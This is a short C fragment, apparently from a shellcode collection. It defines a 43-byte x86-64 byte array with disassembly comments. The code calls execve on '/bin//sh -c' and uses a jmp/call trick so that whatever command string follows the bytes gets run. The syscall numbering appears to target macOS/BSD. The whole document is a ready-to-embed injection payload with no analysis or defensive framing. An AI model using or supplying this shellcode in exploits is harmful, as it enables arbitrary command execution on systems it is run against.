
// Target architecture : X86 64

#define CMD_SIZE 43

char CMD[] = {
  /* 0000 */ "\x6a\x3b"                                 /* push    0x3b                    */
  /* 0002 */ "\x58"                                     /* pop     rax                     */
  /* 0003 */ "\x99"                                     /* cdq                             */
  /* 0004 */ "\x0f\xba\xe8\x19"                         /* bts     eax, 0x19               */
  /* 0008 */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* movabs  rbx, 0x68732f2f6e69622f */
  /* 0012 */ "\x52"                                     /* push    rdx                     */
  /* 0013 */ "\x53"                                     /* push    rbx                     */
  /* 0014 */ "\x54"                                     /* push    rsp                     */
  /* 0015 */ "\x5f"                                     /* pop     rdi                     */
  /* 0016 */ "\x52"                                     /* push    rdx                     */
  /* 0017 */ "\x66\x68\x2d\x63"                         /* push    0x632d                  */
  /* 001B */ "\x54"                                     /* push    rsp                     */
  /* 001C */ "\x5b"                                     /* pop     rbx                     */
  /* 001D */ "\x52"                                     /* push    rdx                     */
  /* 001E */ "\xeb\x06"                                 /* jmp     0x26                    */
  /* 0020 */ "\x53"                                     /* push    rbx                     */
  /* 0021 */ "\x57"                                     /* push    rdi                     */
  /* 0022 */ "\x54"                                     /* push    rsp                     */
  /* 0023 */ "\x5e"                                     /* pop     rsi                     */
  /* 0024 */ "\x0f\x05"                                 /* syscall                         */
  /* 0026 */ "\xe8\xf5\xff\xff\xff"                     /* call    0x20                    */
};